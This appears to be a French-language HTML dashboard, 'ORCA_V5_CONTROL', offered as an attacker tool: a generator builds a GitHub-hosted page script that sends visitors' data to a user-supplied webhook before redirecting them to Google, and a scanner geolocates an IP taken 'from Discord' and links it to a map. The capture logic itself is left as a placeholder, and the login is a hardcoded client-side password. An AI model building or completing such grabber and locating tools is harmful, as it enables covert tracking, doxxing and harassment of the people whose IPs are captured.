<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>ORCA_SECURE_ACCESS</title>
    <style>
        :root { --neon: #00ff41; --bg: #050505; }
        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        
        /* Écran de Login */
        #login-screen { text-align: center; border: 1px solid var(--neon); padding: 40px; background: #000; box-shadow: 0 0 20px rgba(0,255,65,0.2); }
        input { background: #000; color: var(--neon); border: 1px solid var(--neon); padding: 10px; text-align: center; font-size: 18px; outline: none; }
        
        /* Dashboard (Caché par défaut) */
        #main-dashboard { display: none; width: 95%; max-width: 1000px; border: 1px solid var(--neon); padding: 25px; height: 85vh; overflow-y: auto; background: rgba(0,10,0,0.95); }
        
        .tabs { display: flex; gap: 10px; margin-bottom: 20px; border-bottom: 1px solid #222; }
        .tab { cursor: pointer; padding: 10px 20px; border: 1px solid #222; border-bottom: none; }
        .tab.active { background: var(--neon); color: #000; font-weight: bold; }
        .section { display: none; }
        .section.active { display: block; }
        button { background: transparent; color: var(--neon); border: 1px solid var(--neon); padding: 10px; width: 100%; cursor: pointer; font-weight: bold; margin: 10px 0; }
        button:hover { background: var(--neon); color: #000; }
        pre { background: #000; padding: 15px; border: 1px dashed #333; font-size: 11px; white-space: pre-wrap; }
        .log-box { font-size: 11px; color: #666; max-height: 150px; overflow-y: auto; background: #000; border: 1px solid #111; padding: 10px; }
    </style>
</head>
<body>

    <div id="login-screen">
        <h2 style="letter-spacing: 5px;">ORCA_OS_LOGIN</h2>
        <p style="font-size: 12px; color: #666;">ENTREZ LE CODE D'ACCÈS MAÎTRE</p>
        <input type="password" id="pass" placeholder="••••••••" onkeydown="if(event.key==='Enter') verify()">
        <br><br>
        <button onclick="verify()" style="width: 150px;">DÉVERROUILLER</button>
    </div>

    <div id="main-dashboard">
        <div style="display:flex; justify-content: space-between; align-items: center;">
            <h2 style="margin:0;">ORCA_V5_CONTROL</h2>
            <button onclick="location.reload()" style="width: auto; padding: 5px 15px; font-size: 10px;">LOGOUT</button>
        </div>
        <hr style="border:0; border-top:1px solid #222; margin: 20px 0;">

        <div class="tabs">
            <div class="tab active" onclick="openTab('gen')">GENERATOR</div>
            <div class="tab" onclick="openTab('osint')">OSINT SCANNER</div>
        </div>

        <div id="gen" class="section active">
            <input type="text" id="wh-url" placeholder="Webhook URL">
            <input type="text" id="redir" value="https://www.google.com">
            <button onclick="generate()">GÉNÉRER LE CODE INDEX</button>
            <pre id="output">// Le code s'affichera ici...</pre>
        </div>

        <div id="osint" class="section">
            <input type="text" id="ip-in" placeholder="Coller l'IP de Discord">
            <button onclick="scan()">SCANNER L'IP</button>
            <div id="res" style="border: 1px solid #222; padding: 15px; margin-top: 10px; display:none;"></div>
        </div>

        <h4>JOURNAL D'ACTIVITÉ :</h4>
        <div id="logs" class="log-box"></div>
    </div>

    <script>
        const MASTER_PASS = "ORCA2026"; // TON MOT DE PASSE ICI

        function verify() {
            const input = document.getElementById('pass').value;
            if(input === MASTER_PASS) {
                document.getElementById('login-screen').style.display = 'none';
                document.getElementById('main-dashboard').style.display = 'block';
                document.body.style.alignItems = 'flex-start';
                addLog("ACCÈS AUTORISÉ : SESSION_ACTIVE");
            } else {
                alert("CODE INCORRECT");
                document.getElementById('pass').value = "";
            }
        }

        function openTab(id) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
            event.currentTarget.classList.add('active');
            document.getElementById(id).classList.add('active');
        }

        function addLog(m) {
            const t = new Date().toLocaleTimeString();
            document.getElementById('logs').innerHTML = `[${t}] ${m}<br>` + document.getElementById('logs').innerHTML;
        }

        function generate() {
            const wh = document.getElementById('wh-url').value;
            if(!wh) return;
            // Code simplifié pour l'exemple
            document.getElementById('output').innerText = `\n<script>const WH="${wh}";\n// ... Ton code de capture ...\n<\/script>`;
            addLog("Nouveau code généré pour GitHub.");
        }

        async function scan() {
            const ip = document.getElementById('ip-in').value;
            const rBox = document.getElementById('res');
            if(!ip) return;
            rBox.style.display = "block";
            rBox.innerHTML = "Analyse...";
            try {
                const r = await fetch('https://ipapi.co/'+ip+'/json/');
                const d = await r.json();
                rBox.innerHTML = `ISP: ${d.org}<br>VILLE: ${d.city}<br><a href="https://www.google.com/maps?q=${d.latitude},${d.longitude}" target="_blank">LIEN MAPS</a>`;
                addLog(`Scan IP ${ip} terminé.`);
            } catch(e) { rBox.innerHTML = "Erreur."; }
        }
    </script>
</body>
</html>
